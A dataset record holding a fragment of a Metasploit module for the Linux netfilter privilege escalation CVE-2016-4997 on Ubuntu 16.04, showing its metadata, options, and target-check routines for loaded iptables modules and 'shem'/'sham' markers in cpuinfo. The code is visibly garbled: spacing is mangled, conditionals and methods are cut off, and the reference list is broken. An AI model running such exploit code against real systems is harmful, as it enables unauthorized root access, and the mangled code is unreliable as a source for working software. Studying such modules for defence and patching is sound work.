{
    "text": "vul_name : Linux Kernel 4.6.3 Netfilter Privilege Escalation ， vul_cve : CVE-2016-4997 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require \"msf/core\" ， class MetasploitModule < Msf : Exploit : Local ， Rank = GoodRanking ， include Msf : Post : File ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => 'Linux Kernel 4.6.3 Netfilter Privilege Escalation' ,  ， 'Description' => %q{ ， This module attempts to exploit a netfilter bug on Linux Kernels befoe 4.6.3 , and currently ， only works against Ubuntu 16.04 ( not 16.04.1 ) with kernel ， 4.4.0-21-generic. ， Several conditions have to be met for successful exploitation :  ， Ubuntu :  ， 1. ip_tables.ko ( ubuntu )  , iptable_raw ( fedora ) has to be loaded ( root running iptables -L will do such )  ， 2. libc6-dev-i386 ( ubuntu )  , glibc-devel.i686 & libgcc.i686 ( fedora ) needs to be installed to compile ， Kernel 4.4.0-31-generic and newer are not vulnerable. ， We write the ascii files and compile on target instead of locally since metasm bombs for not ， having cdefs.h ( even if locally installed )  ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'h00die <mike @ stcyrsecurity.com>' ,  # Module ， 'vnik' # Discovery ，  ]  ,  ， 'DisclosureDate' => 'Jun 03 2016' ,  ， 'Platform' => [ 'linux' ]  ,  ， 'Arch' => [ ARCH_X86 ]  ,  ， 'SessionTypes' => [ 'shell' , 'meterpreter' ]  ,  ， 'Targets' => ，  [  ，  [ 'Ubuntu' , { } ]  ，  #  [ 'Fedora' , { } ]  ，  ]  ,  ， 'DefaultTarget' => 0 ,  ， ' ，  [  ，  [ 'EDB' , '40049' ]  ,  ，  [ 'CVE' , '2016-4997' ]  ,  ，  [ 'URL' , ' ，  ]  ， register_options (  ，  [  ， OptString.new ( 'WritableDir' ,  [ true , 'A directory where we can write files ( must not be mounted noexec ) ' , '/tmp' ]  )  ,  ， OptInt.new ( 'MAXWAIT' ,  [ true , 'Max seconds to wait for decrementation in seconds' , 180 ]  )  ,  ， OptBool.new ( 'REEXPLOIT' ,  [ true , 'desc already ran , no need to re-run , skip to running pwn' , false ]  )  ,  ， OptEnum.new ( 'COMPILE' ,  [ true , 'Compile on target' , 'Auto' ,  [ 'Auto' , 'True' , 'False' ]  )  ，  ]  , self.class )  ， end ， def check ， def iptables_loaded? (  )  ，  # user @ ubuntu :  ~  $ cat /proc/modules | grep ip_tables ，  # ip_tables 28672 1 iptable_filter , Live 0x0000000000000000 ，  # x_tables 36864 2 iptable_filter , ip_tables , Live 0x0000000000000000 ， vprint_status ( 'Checking if ip_tables is loaded in kernel' )  ， iptables = cmd_exec ( 'cat /proc/modules | grep ip_tables' )  ， vprint_good ( 'ip_tables.ko is loaded' )  ， print_error ( 'ip_tables.ko is not loaded. root needs to run iptables -L or similar command' )  ， end ， elsif target.name = \"Fedora\" ， iptables = cmd_exec ( 'cat /proc/modules | grep iptable_raw' )  ， vprint_good ( 'iptable_raw is loaded' )  ， print_error ( 'iptable_raw is not loaded. root needs to run iptables -L or similar command' )  ， end ， end ， end ， def shemsham_installed? (  )  ，  # we want this to be false. ， vprint_status ( 'Checking if shem or sham are installed' )  ， shemsham = cmd_exec ( 'cat /proc/cpuinfo' )  ， print_error ( 'shem installed , system not vulnerable.' )  ， elsif shemsham.include? ( 'sham' )  ， print_error ( 'sham installed , system not vulnerable.' )  ， vprint_good ( 'shem and sham not present.' )  ， end ， end",
    "time": "2016.09.27"
}